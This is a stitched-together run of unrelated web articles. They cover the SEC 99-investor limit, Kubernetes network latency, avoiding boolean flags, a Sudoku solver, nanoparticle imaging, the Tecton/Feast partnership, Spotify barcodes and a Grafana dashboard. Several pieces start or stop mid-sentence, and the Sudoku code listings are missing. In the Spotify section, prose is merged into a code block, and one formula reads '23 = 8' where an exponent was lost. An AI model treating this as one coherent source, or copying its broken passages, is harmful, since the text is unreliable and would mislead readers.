sophistication</em></strong>.</p></blockquote><p>(Emphasis ours.)</p><p>We salute this change, and even though we think the SEC has further to go in terms of widening the definition of accredited investors, it’s a great first step. This change is well inline with the SECs ongoing efforts to “simplify, harmonize, and improve the exempt offering framework, thereby expanding investment opportunities while maintaining appropriate investor protections and promoting capital formation.”</p><p><strong>&nbsp;However, we believe that the current limit of 99 accredited investors per 3(c)(1) fund runs counter to these efforts.</strong></p><h2>The many downsides of the 99 accredited investor limit</h2><p>The current limit of 99 accredited investors <strong>hurts capital formation</strong>, <strong>reduces investment opportunities</strong>,&nbsp; <strong>increases the risk to individual investors</strong> and <strong>decreases access to private capital markets for underrepresented groups</strong>.</p><ul data-rte-list="default"><li><p>A fund manager can accept smaller checks from wealthier individuals, as the higher QP limit in the sleeve means that there is effectively no minimum amount required of those individuals. </p></li><li><p>Conversely, and perversely, a fund manager looking to raise a more substantial fund is forced to ask for larger checks from the less wealthy investor, or keep that investor out of the fund entirely.</p></li></ul><p><strong>This is far from ideal and, in our experience, excludes sophisticated investors from being allowed to invest in funds like ours. </strong>In some cases these excluded investors have a deep understanding of the industry being invested into, and perhaps with atypical backgrounds as far as fund investors go. <strong>We do not believe those kinds of investors should be effectively excluded from making these kinds of investments.</strong></p><p>Instead what happens is that as funds grow from very small (sub $10m) they are forced to seek capital from larger, institutional investors like Fund of Funds, Endowments and various Family Offices.</p><p><strong>While these more institutional LPs are a fine source of capital, it’s undoubtedly true that they are more risk averse and in general prone to relying on a proven track record for the managers they back.&nbsp;</strong></p><p>A great example of this is the University of Texas’ (laudable) Emerging Managers Program. This is a program setup explicitly to support new (aka emerging) managers, though the criteria for selection includes:</p><ul data-rte-list="default"><li><p>Attributable track record within target strategy</p></li><li><p>Investment teams with history of working together</p></li><li><p>Principals known in the investment community and are positively referenceable</p></li></ul><p><strong>Clearly, such terms favor managers that “emerge” from existing funds.</strong> This means that the type of general partners that more easily get backing from these kinds of investors are of the same mold as GPs that already exist.<strong> New and diverse GPs with novel ways to invest are effectively locked into staying small or violating SEC rules.</strong></p><h2>Proposed solution: <br><strong>Allow as many Accredited Investors as Qualified Purchasers.</strong></h2><p>The oversight of private funds is light by definition, so we fully understand why the SEC imposes a limit on the number of investors. Without a limit, a fraudulent fund could become a significant issue if tens or hundreds of thousands of investors could invest.&nbsp;</p><p><strong>However, we feel the unintended consequences of concentrating wealth creation to only super high net worth individuals or institutional investors with the 99 Accredited Investors limit is not the right trade-off in this regard.</strong> We propose that private funds relying on the 3(c)(1) exemption should be allowed to admit up to 1999 accredited investors, assuming they are required to make reasonable efforts to verify that investors are in fact accredited (something that is already a requirement for a 506c offering.)</p><h3><strong>If you are an emerging manager or stakeholder who would like to see the 99 investor limit raised, send us an email at </strong><a href="mailto:hello@tinyseed.com"><strong>hello@tinyseed.com</strong></a><strong>.</strong></h3><p><strong>Please help raise awareness of this issue:</strong></p><ul data-rte-list="default"><li><p><a href="https://twitter.com/intent/tweet?text=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem%20" target="_blank">Share on Twitter</a></p></li><li><p><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on Facebook</a></p></li><li><p><a href="https://www.linkedin.com/shareArticle?mini=true&amp;source=TinySeed&amp;summary=The%20SEC%20limit%20of%2099%20investors%20on%20investment%20funds%20over%20%2410m%20has%20significant%20unintended%20consequences.%20Read%20about%20the%20issue%20and%20join%20TinySeed%20in%20support%20to%20change%20the%20law%3A%20&amp;title=&amp;url=https%3A%2F%2Ftinyseed.com%2Flatest%2F99-investor-problem" target="_blank">Share on LinkedIn</a></p></li></ul></div></div></div>]]>

<p>Are you considering using containers? Do you care about network latency? If so, read on.</p>
<p>Kubernetes is an open-source container platform. It creates a cluster made out of a set of infrastructures. To accomplish things like load balancing and container-to-container communication, Kubernetes relies on both a network overlay inside the cluster and a proxy process called the kube-proxy that runs on each node in the cluster. This post will describe two ways you can have ultra-low latency for containers: physical servers and Kubernetes's new IPTables-based proxy mode.</p>
<h2>Item #1 - Consider Using Physical Servers Rather than Virtual Machines</h2>
<p>Physical servers don't have the hypervisor overhead layer that is common to virtual machines (VMs). As such, running containers directly on Bare Metal (physical servers) should offer you faster performance. But how much of a difference? As it turns out, there is quite a bit of difference.</p>
<p>Here at CenturyLink Cloud, we offer Kubernetes clusters on both VMs and <a href="https://www.ctl.io/bare-metal/">Bare Metal</a> servers. To test network latency, we used the open-source netperf testing utlity that the Kubernetes community <a href="https://github.com/kubernetes/contrib/tree/master/netperf-tester">wrapped up</a> in order to make it easily deployable to a Kubernetes cluster. The test has a client process running inside a Docker container on one host in the cluster, and a server process running inside a Docker container on a different host in the cluster. When comparing VMs to our smallest physical servers (the 4-core option) located in our VA1 data center <strong>we saw a 3x improvement in network latency</strong>. Now, we would like to share how we did these tests and the detailed test results.</p>
<h2>Kubernetes Cluster Creation</h2>
<p>Using the tool <a href="https://www.ctl.io/knowledge-base/container-services/getting-started-with-kubernetes/">found here</a>, we created two Kubernetes clusters on top of the CenturyLink Cloud infrastructure. One cluster was made up of four Bare Metal servers and the other cluster was made up of four VMs.</p>
<p><strong>Commands to Create the Two Clusters</strong></p>
<pre><code>./kube-up.sh -c=k8s-baremetal1 -d=VA1 -m=4 -t=bareMetal
./kube-up.sh -c=k8s-vm1 -d=VA1 -m=4 -t=standard -mem=8 -cpu=4

# Drink coffee and wait around about 15 minutes...
</code></pre><h2>Run the Network Tests</h2>
<p>Next, we needed to perform the network tests. To build the netperf Golang tool, we ran:</p>
<pre><code>git clone https://github.com/kubernetes/contrib/
cd contrib/netperf-tester
godep go build
</code></pre><p>To run the network testing tool, we ran the following test against each cluster.</p>
<p><strong>Note:</strong> This tool uses the kubectl CLI tool to communicate to the Kubernetes cluster in order to run the tests. We ran this command twice, once against each Kubernetes cluster.</p>
<pre><code>./netperf-tester -number 1000
</code></pre><h2>Test Results</h2>
<p>A snippet from the test results looks like this:</p>
<p><strong>Bare Metal Servers</strong>
<img src="https://www.ctl.io/developers/assets/images/blog/kubernetes-physical-servers.png" alt="Physical Servers"></p>
<p><strong>Virtual Machines</strong>
<img src="https://www.ctl.io/developers/assets/images/blog/kubernetes-vm-numbers.png" alt="Virtual Machines"></p>
<h2>Physical vs VMs - Network Latency Histogram</h2>
<p>We then took the full results (1000 measurements on each platform) and created a histogram chart similar to the one above. The results are pretty impressive, around a 3x improvement. Also, you will notice that the jitter (standard deviation) seen in the physical server results is much smaller.</p>
<p><img src="https://www.ctl.io/developers/assets/images/blog/kubernetes-mean-latency.png" alt="Mean Latency"></p>
<p>As you can see, running Kubernetes and containers on the physical machines provides much lower latency than running Kubernetes on virtual machines. If you are running containers, and network latency is important to you, you may want to consider <a href="https://www.ctl.io/bare-metal/">Bare Metal Servers</a> as an option.</p>
<h2>Item #2 - Use Kube-proxy IPTables Mode.</h2>
<p>Regardless of the hardware you choose to run your cluster on, the Kubernetes community has made substantial progress on building out networking services that are both scalable and highly performance-oriented. One recent improvement from the open source community is the re-basing of the kube-proxy process to use IPTables on the host to perform various load-balancing, proxy, and NAT functions. As seen in the diagram below, this change decreased latency as measured by the open-source network testing tool netperf. Latency (measured in microseconds) seen by the older method (called userspace) can be seen in red while the latency of the newer method (called IPTables) can be seen in blue.</p>

For the source information, <a href="https://github.com/kubernetes/kubernetes/issues/12682">click here</a>.</p>
<p>Nice work Kubernetes community! If you are a Kubernetes user, nothing is required of you as new Kubernetes clusters now come with IPTables proxy mode enabled by default. If you are running an older version of Kubernetes, consider upgrading.</p>
<h2>Summary</h2>
<p>If you care about ultra low latency networking for containers, consider using physical machines. If you don't care about this, you might want to consider using virtual machines to run your containers as you can scale more incrementally.</p>
<p>Thanks for reading,
Chris Kleban</p>

<p>In most major code bases, it’s common to have objects with lots of Boolean flags indicating what state they’re in. E.g. is an enemy targeting the player or not? Is it trying to flee or not? If you have a set of mutually exclusive flags an enum can be used instead, but this is often not possible, and doesn’t change much in terms of the downsides.</p>

<p>In my opinion these are code smells. Smells don’t <em>necessarily</em> indicate actual issues, just patterns that are likely to be used incorrectly and thus warrants extra care.</p>

<p>In many cases if you think about how to avoid flags you’re forced change the code in ways that result in clearer code (specifically several simple functions rather than one general function that checks a dozen flags), as well as improved performance due to fewer branches and cache misses. Let me stress that the main gain here is the improved code quality, so don’t be fooled into thinking this is some kind of optimization – better performance is a happy side effect. And yes, there are cases where flags are the clearer option as well (see below).</p>

<h2 id="an-example">An example</h2>

<p>For a somewhat contrived example, consider a game rendering system. Each object in the world has some rendering state associated with it, this would be things like what meshes and materials to use, but also various flags determining how it’s to be rendered.</p>

<p>Let’s say we have a flag called isDynamic, which tells us if the object can move or if it’s static. We can change the flag throughout the life of the object, but when it’s set to false we assume it’s going to be static for some time (so we pay some up-front cost to pre-calculate some acceleration structures that pay off during actual rendering).</p>

<p>Sometimes you want to temporarily toggle rendering for an object so we check this in the renderer as well by adding an isVisible flag.</p>

<p>In addition, the object as a whole may have an isEnabled flag which lets us disable the whole object (physics, animation, rendering all ignore it when it’s not enabled).</p>

<p>Ok, so far we have three flags which means we have 23 = 8 possible combinations of flags, but do we really have eight separate <em>legal</em> states? No! E.g. an object which is not enabled can’t be visible. You could also argue that an object which is disabled or invisible is _neither _dynamic nor static. So we have significantly more <em>possible</em> states than <em>legal</em> states, and it’s very easy to accidentally end up in an illegal state by forgetting to check a flag in one of the many branches throughout the renderer (e.g. perhaps you go down the “isDynamic” branch somewhere for an object which is invisible, thus getting yourself into an inconsistent state). As you add more flags the set of possible states explodes, and it’s common for the interdependencies to be complex and easy to mess up in all the places you have to check.</p>

<h2 id="an-alternative">An alternative</h2>

<p>Instead of storing all these flags, take a step back and think about what the point of each flag is. The isDynamic flag is there to distinguish between dynamic and static objects. A different way of doing this is for the renderer to simply keep an array of dynamic objects and an array of static objects.</p>

<p>The isVisible flag is different. It means the object should be in <em>neither</em> the dynamic or static array. For the whole-object enabled flag we can do something similar, but for each sub-system.</p>

<p>The exact way you avoid any given flag will differ depending on what the purpose of the flag is, but you can usually find a way to avoid it._
        _</p>

<p>So that’s the point of all this? Well the main benefit is that all the code spread out through the renderer can now be simpler. Instead of checking flags for a complicated set of legal states all over the code, we just have completely separate functions for each kind of state. E.g. there’s one method to go through all the static objects and render them, another to go through all the dynamic ones. These functions may call into shared helper functions here and there (to avoid duplication), but if you want to know how dynamic objects get rendered there’s a single place to start reading, and it will be easier to understand because the code is handling fewer cases.</p>

<p>The complexity isn’t entirely gone, it’s just moved. It’s now in methods like “SetVisible”, “SetDynamic” and so on. This is far better, since the complexity is now <em>localized</em>, making it easier to ensure correctness.</p>

<p>A brief note on performance: As we’re now separating things into different arrays to keep the logic clearer, you can often also split the data up across different arrays, which improves the cache locality for the functions that deal with that particular part of the state. For example, objects may use different data if they’re static or dynamic so if you can avoiding have to “step over” the static data in the dynamic code-path that’s going to save lots of cache misses.</p>

<h2 id="what-about-checking-which-state-an-object-is-in">What about checking which state an object is in?</h2>

<p>If you use the proposed scheme most code never actually have to check any per-object flags, because the data already comes pre-sorted to the “processing” code (and is kept sorted by the state transition code). However, there are exceptions. Sometimes you really do want to check what state a specific object is in. This means doing an array lookup for each of the different arrays to see if the object is there.</p>

<p>To make this fast, you could store the index for each array in the object, which gives you fast lookups. This does means you’re still storing state-related information in the object itself (one index per array), but it can be <em>private</em> information so you still get the other benefits - the renderer still doesn’t have to check flags.</p>

<p>Another option is to make sure each object uses the <em>same</em> index in all the arrays it’s in. You generate a unique ID for each object, and use this as the location for the object in all arrays. The obvious way to do this is to allocate MAX_OBJECT_COUNT-sized arrays for all possible states, but that can of course be wasteful (and costly - gaps in the array cost cache misses when traversing). A better way is to use a “sparse array”, which only stores objects that are actually in the array, but still allows O(1) lookup. A hash table is a reasonable backing-store for this, but you can do better if you let your IDs be unique ints with uniform distribution (no need to actually hash anything, use the ID as-is in a <a href="http://sebastiansylvan.com/2013/05/08/robin-hood-hashing-should-be-your-default-hash-table-implementation/">Robin-hood style</a> hash table).</p>

<h2 id="when-not-to-use-this">When not to use this</h2>

<p>I said above that flags are a code smell, not code bugs! There’s plenty of cases where using flags is entirely appropriate. E.g. if you set flags multiple times per frame then the increased cost of moving it between different arrays all the time is likely a bad idea. Also, if you use the sparse array idea above checking a flag is a lot more expensive so if you do this frequently you should probably at least cache the result of this lookup in a flag. Another scenario is if you only have one of something, there’s really no reason to have multiple arrays in that case, since most arrays will be empty. Also, sometimes the added cognitive overhead of multiple arrays just isn’t worth it if the code is trivial. Last but not least, sometimes it’s just damn difficult to figure out how to avoid a flag and spending too much effort jumping through hoops to satisfy some rule of thumb is just dogmatic.</p>

<p>Even if you go with the suggested approach above, you may still need an actual flag to handle the state transitions appropriately. E.g. if you make an object visible after it’s been invisible you probably need to know if you should add it to the dynamic or static array now that it’s visible. The point isn’t to have no flags at all (despite the title), it’s to move the resulting complexity to the code that actually deals with the _state transition_s, instead of spreading (and duplicating) that same complexity all over the code.</p>

<h2 id="more-resources">More resources</h2>

<p>If this approach appeals to you, you really should look into data-oriented design. I’m a fan of this approach (first and foremost consider the data, and how it gets processed, don’t obsess over object identity), but I would advocate moderation. There are often benefits to having some of the state <em>with</em> the object, instead of having everything be implicit based on what component arrays it’s in (in terms of readability, and sometimes even performance). Resist the temptation to be an extremist about this, that’s really no different than the programmer who uses design patterns every chance they get.</p>

<p>A few months back I was in an hotel room at 4 am in the morning when the thermostat inexplicably decided to heat my room to 90 degrees Fahrenheit. That woke me up, and since I had nothing to do for a few hours I decided to write a Sudoku solver (because everyone has to write one).</p>

<p>I hadn’t thought about it since then, until I ran across <a href="https://abhinavsarkar.net/posts/fast-sudoku-solver-in-haskell-3/">this post</a> on reddit and decided to run the same puzzles through my solver and see how it did.</p>

<p><strong>The upshot is that I can do all 49151 puzzles from the post above in about 650ms</strong>. For comparison, the Haskell solution referenced above does it in about 35s. We’re using different machines etc. so it’s not the most scientific comparison in the world (but I doubt my PC is 50x faster), and I don’t really know how much of this is C vs Haskell speed and how much of it is my implementation choices so I’m really not trying to rag on their solution or Haskell (in fact, you should read the posts, they’re  well written and I enjoyed reading Haskell again after many years!).</p>

<p>Anyway, since my solution is slightly different, and I haven’t blogged in a long time, this seemed worth writing up.</p>

<p>Before I wrote any code I went to Peter Norvig’s <a href="http://norvig.com/sudoku.html">Sudoko post</a> just because I remember reading it a few years ago and it seemed like a good place to refresh my memory of the Sudoku rules, and some of the terminology. I didn’t follow along with his solution, so ended up with a slightly different way of doing it, but if the method names and terminology seems similar, that’s why.</p>

<h2 id="performance-from-the-start">Performance from the start</h2>

<p>One of the things I wanted to do when playing around with this was to make sure things were written to be fast (the way you write code when working on games, or other performance sensitive code).</p>

<p>One of my pet peeves is the “Premature optimization is the root of all evil”-crowd, where it almost seems as if people write intentionally slow code because giving <em>any</em> consideration to performance while writing the code is “evil”. This is a gross mischaracterization of what Knuth actually said, and it is certainly not how you write fast systems. For fast systems, you have to consider performance up front and throughout - that doesn’t mean you optimize every line of code with a profiler right away, just that you write it with reasonable performance choices.</p>

<h2 id="the-code">The code</h2>

<p>I knew that this was going to involve a lot of brute force searching and copying of the board state, which meant I wanted to keep it simple and without allocations or other overhead (which isn’t needed for this solution). The main data structure looks like this:</p>

</div>
</div>
<p>First, I have a 9x9 grid of squares, each one contains a 9-bit bitmask of possible digits that this square can contain (thus they are initialized to 9 ones, or <code>0x1FF</code>). I use a <code>uint16_t</code> because it’s the smallest type that fits 9 bits, the top 7 bits are unused). Some other solutions start off by using some abstract “set” data structure, which IMO seems like overkill. It seems fair to assume that most programmers will know (or can learn) how one might use a bit field to represent small sets, but it wouldn’t be hard to wrap that <code>uint16_t</code> in a struct with some set operations on it.</p>

<p>This is the main board state and once each of these bit masks have only one bit set, we are done and have a solution. Note that I assume all digits are zero-based for convenience (i.e. I subtract one when loading, and add one when printing).</p>

<p>Next, and here’s where my solution is a bit different from others I’ve seen, I maintain a “reverse index” for each digit. So for each digit in each “unit” (row, column or 3x3 block), it maintains a bit mask of where that digit is still a possibility. Initially each digit is possible in every location of the unit, so they too are initialized to <code>0x1FF</code>. Having this reverse index means I don’t have to search through all of the “peers” (i.e. squares in the same row, column or block) in order to elimiate a digit - I can directly find which squares need it eliminated. It also means I can easily figure out when a given digit only has one remaining possible location (see further below).</p>

<p>In order to copy this board state, a simple memcpy will do. There are no allocations, and this will all live on the stack during the search.</p>

<p>In a few places below I need to loop over all the set bits in one of these bit masks, so I have this simple macro for that.</p>
<div><div>

</div>
</div>
<p><code>_BitScanForward</code> just gives you the index of the least significant set bit (on MSVC, other compilers have similar intrinsics), and the magic bit fiddling clears the first set bit. Then it runs the loop <code>body</code> with the variable <code>bit_index</code> set to the index of the bit.</p>

<p>The meat of the algorithm is the <code>eliminate</code> method. It takes a location and a set of digits to eliminate and also propagates the contraints flowing from that elimination.</p>

<p>We also have to update the “reverse index”. To do this we loop through all the bits that we’re eliminating, and for each one we clear out the current coordinate in its bitmasks.</p>

<p>One slightly interesting thing to note here is that I’m intentionally keeping things very simple in terms of abstraction and complexity. I don’t make any attempt to abstract over the “units” or anything like that. Why? Because we only have three kinds of units, not twenty, so it really doesn’t buy you much. Yes, I’m kinda repeating myself three times here (and I will again below), but in return you get code that has fewer layers of abstractions for people to internalize and understand.</p>

<p>Plus, as I mentioned above I wanted to write this with performance in mind from the start. That means not introducing abstractions in the inner loop in order to avoid minor duplication. If two choices are approximately of equal value (each has pros an cons) and one of them is <em>likely</em> to be faster, then pick the likely-to-be-faster one. You still need to measure at some point to see if you were right, but you can often make decent guesses too. So let’s hold off on adding in abstractions until they buy us <em>a lot</em> more in terms of readability.</p>

<p>Anyway, back to the code. At this stage the board state is updated with the elimination, and now we have to handle the consequences of the elimination.</p>

PANORAMA can be used to detect, count and determine the size of individual dielectric nanoparticles.</p><p>Wei-Chuan Shih, professor of electrical and computer engineering at UH and corresponding author for the paper, said the smallest transparent object a standard microscope can image is between 100 nanometers and 200 nanometers. &nbsp;That’s mainly because – in addition to being so small – they don’t reflect, absorb or “scatter” enough light, which could allow imaging systems to detect their presence.</p><p>Labeling is another commonly used technique; it requires researchers to know something about the particle they are studying – that a virus has a spike protein, for example – and engineer a way to tag that feature with fluorescent dye or some other method in order to more easily detect the particle.</p><p>“Otherwise, it will appear as invisible as a tiny dust particle under the microscope, because it’s too small to detect,” Shih said.</p><p>Another drawback? Labeling is only useful if researchers already know at least something about the particle they want to study.</p><p>“With PANORAMA, you don’t have to do the labeling,” Shih said. “You can view it directly because PANORAMA does not rely on detecting the scattered light from the nanoparticle.”</p><p>Instead, the system allows observers to detect a transparent target as small as 25 nanometers by monitoring light transmission through the gold nanodisc-covered glass slide. By monitoring changes in the light, they are able to detect the nearby nanoparticles. The optical imaging system is a standard bright-field microscope commonly found in any lab. There is no need for lasers or interferometers which are required in many other label-free imaging technologies.</p><p>“The size limit has not been reached, according to the data. We stopped at 25 nm nanoparticles simply because that is the smallest polystyrene nanoparticle on the market,” Shih said.</p><p>In addition to Shih, researchers involved in the project include Ph.D. students Nareg Ohannesian and Ibrahim Misbah, both with UH, and Dr. Steven H. Lin with the Department of Radiation Oncology at M.D. Anderson Cancer Center.</p><p>–</p><p><i>Header image:&nbsp;Scientists have reported a new optical imaging technology, using a glass side covered with gold nanodiscs that allows them to monitor changes in the transmission of light and determine the characteristics of nanoparticles as small as 25 nanometers in diameter.

<hr>



<p>Today, we’re excited to announce that Tecton is becoming a core contributor to the <a href="http://feast.dev/">Feast</a> open source feature store, and that Willem Pienaar, creator of Feast, is joining the Tecton team. In other words, we’re strong believers in the Feast project and are investing meaningful resources into its success. We share a joint vision with Willem: enable every organization to operationalize ML at scale by allowing teams to build and deploy features quickly and reliably.</p>



<p>If you’ve been following Tecton, you know that we’re also building our own commercial feature store that’s currently in early access and soon-to-become Generally Available. And this naturally raises a few questions: why invest in two feature stores, and what does this mean for both Feast and the Tecton feature store?</p>







<h2>Making Feature Stores Accessible to Every Organization</h2>



<p>We believe that feature stores are an essential part of the modern ML stack because they solve the hardest problem of productionizing operational ML: getting fresh feature data reliably computed and served into production. As discussed in <a href="https://www.tecton.ai/blog/what-is-a-feature-store/">“What is a Feature Store?”</a>, a feature store solves this problem by managing feature transformation pipelines, storing features, and serving features in production. The Tecton founding team saw the need for a feature store at Uber where we built the Michelangelo project. Similarly, other technology companies like Gojek also realized the importance of feature stores, leading to the development of Feast.</p>



<p>Unfortunately, feature stores have up to now been accessible only to the largest, most sophisticated technology companies that have the skills and resources to build their own infrastructure.</p>



<p>For the rest of the industry, this technology has remained mostly out of reach. Building your own feature store requires dedicated teams of highly skilled engineers and multiple years of development time. Our objective is to change this, and to put feature stores in reach of every organization, regardless of their ML maturity and available commercial resources.</p>







<h2>Freedom to Choose Between Open Source and Commercial Software</h2>



<p>We have seen strong demand for teams to enter the early access program we introduced earlier this year. We’ve partnered with customers ranging from small growth-stage startups to large Fortune 50 companies, across North America and Europe. We now have customers like <a href="https://2b838p24nks2163of0383y6z-wpengine.netdna-ssl.com/wp-content/uploads/2020/10/Atlassian-Case-Study-201006.pdf">Atlassian</a> running at production scale on the Tecton enterprise feature store.</p>



<p>Along the way, we’ve learned that user needs vary significantly based on their level of maturity, size, and resources. Cloud services are preferred by larger teams that are operationalizing ML at scale and need to move fast, offload the burden of managing and updating software, and have guaranteed service levels with enterprise support. On the other hand, open source is highly valued by small ML teams that are just starting out and want to get their hands dirty, and by large organizations that need to customize the software to their specific needs and have the resources and skills to self-manage their ML infrastructure.</p>



<p>Our objective at Tecton is to solve the data problem for Operational ML for all organizations. The Tecton enterprise feature store is only available as a managed cloud service, leaving a gap for organizations that need open source software today. To close the gap, we decided to put significant resources behind Feast. Partnering with the Feast project, our plan is to leverage our existing development efforts in and learnings from Tecton to help make Feast the best open source feature store, both for small teams just starting out and for larger teams that need the flexibility of open source. As strong allies, we’re going to advance the state of the art for feature stores and enable their adoption across the industry.</p>







<h2>Feast: The Leading Open Source Feature Store</h2>



<p>Feast was developed jointly by Gojek and Google Cloud, and <a href="https://cloud.google.com/blog/products/ai-machine-learning/introducing-feast-an-open-source-feature-store-for-machine-learning">first announced</a> about two years ago. Since its initial release in 2019, Feast has grown rapidly, with multiple companies, including Microsoft, Agoda, Farfetch, Postmates and Zulily adopting and/or contributing to the project. Today, the project has more than 1,100 GitHub stars and has been adopted as a <a href="https://www.kubeflow.org/docs/components/feature-store/">component in Kubeflow</a>.</p>



<p>Willem and the Feast contributors have a clear <a href="https://blog.feast.dev/post/a-state-of-feast">vision</a> of where they want to take the project, and that vision is very well aligned with Tecton’s vision.</p>



<p>Feast will remain a completely independent project, <a href="https://lfaidata.foundation/blog/2020/11/10/feast-joins-lf-ai-data-as-new-incubation-project/">managed by the LF AI &amp; Data Foundation</a>. Willem will continue to be fully committed to Feast, and an official maintainer of the project. And of course, Feast continues to welcome new users and contributors. If you want to learn more or are looking to use Feast: please check out their resources and get involved!</p>

<h2>Feast and Tecton: Deployment and Support</h2>



<p>Tecton and Feast’s differences are most notable on how they’re deployed and managed: Feast is fully open source and self-managed. Tecton is a fully-managed cloud service and can be deployed into a company’s private VPC, or into a Tecton-provided single-tenant SaaS environment. While Feast got started on GCP and Tecton got started on AWS, both will support GCP, AWS and Azure in 2021.</p>

<h2>Feast and Tecton: Capabilities</h2>



<p>Tecton and Feast have independent roots and were started by different companies. Tecton’s capability set is largely a superset of Feast’s, with a strong focus on fully-fledged transformation support and enterprise capabilities:</p>

<p>Beyond Feast’s capabilities, Tecton’s proprietary capabilities are going to focus on data governance, advanced collaboration and operational excellence.</p>

<h2>Offering a seamless migration between Tecton and Feast</h2>



<p>Often, the preferences between using a managed enterprise offering and a self-managed open source project change over time. An enterprise using Tecton’s managed offering may eventually require greater customizability and prefer to switch to a custom fork of Feast. Similarly, a small team that got started with Feast may eventually desire the enterprise capability and managed service of Tecton. To simplify transitions, Tecton is committed to providing a simple migration path between both projects. This migration path will eventually be enabled via:</p>



<ul><li><strong><strong>Feature Serving API Parity:</strong></strong> The feature serving APIs will be identical, allowing customers to switch between both feature stores without having to modify the feature store clients. Model training notebooks and prediction services running in production can remain largely unchanged as long as the client points at the new Feature Store backend.</li><li><strong><strong>Feature Definition Parity: </strong></strong>Tecton’s feature definition DSL will be a superset of Feast’s DSL. As a result, Feast feature definitions can seamlessly be applied to a Tecton deployment.</li><li><strong><strong>Feature Store Parity: </strong></strong>Tecton and Feast will support the same offline and online feature storage technologies (e.g. S3, Delta, DynamoDB, Redis etc.) and understand the same storage contract. As a result, no physical data will need to be migrated as customers choose to migrate between both projects.</li></ul>

I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Let’s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>

I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave.

This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotify’s database (a look-up table) to determine what URI it corresponds to.

</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

	<p><small>November 17, 2020</small></p>
</div><div><p>One of our more peculiar <a href="https://grafana.com/">Grafana</a> dashboards
exists to show more or less point in time SMART data for the disk
drives on a given server (or some of them). We capture this information
in Prometheus for various reasons, and since we have it in <a href="https://prometheus.io/">Prometheus</a> we want to look at it in a more convenient
way than direct <a href="https://prometheus.io/docs/prometheus/latest/querying/basics/">PromQL</a>
